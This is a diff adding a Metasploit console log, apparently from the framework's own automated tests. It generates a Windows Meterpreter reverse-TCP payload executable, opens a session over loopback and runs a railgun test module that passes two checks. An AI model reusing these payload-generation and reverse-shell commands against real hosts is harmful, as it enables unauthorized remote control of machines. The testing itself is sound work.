@@ -1,0 +1,24 @@
+use windows/meterpreter/reverse_tcp
+[*] Killing all sessions...
+[4mmsf6[0m post([1m[31mtest/railgun[0m) [0m> generate -o D:/a/_temp/meterpreter-spec-rb-windows-meterpreter-reverse-tcp20220119-2208-fq0vz9.exe -f exe MeterpreterTryToFork=false lport=6062 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mwindows/meterpreter/reverse_tcp[0m) [0m> [*] Writing 73802 bytes to D:/a/_temp/meterpreter-spec-rb-windows-meterpreter-reverse-tcp20220119-2208-fq0vz9.exe...
+[4mmsf6[0m payload([1m[31mwindows/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 53
+[4mmsf6[0m payload([1m[31mwindows/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6062 
+[*] Sending stage (175174 bytes) to 127.0.0.1
+[*] Meterpreter session 44 opened (127.0.0.1:6062 -> 127.0.0.1:50167 ) at 2022-01-19 11:15:20 +0000
+use test/railgun_reverse_lookups
+[4mmsf6[0m post([1m[31mtest/railgun_reverse_lookups[0m) [0m> run session=44 addentropy=true verbose=true
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session type: meterpreter
+[*] Running against session 44
+[*] Session type is meterpreter and platform is windows
+[+] should return a constant name given a const and a filter
+[+] should return an error string given an error code
+[*] Testing complete in 0.0079595
+[*] Passed: 2; Failed: 0
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/railgun_reverse_lookups[0m) [0m> 
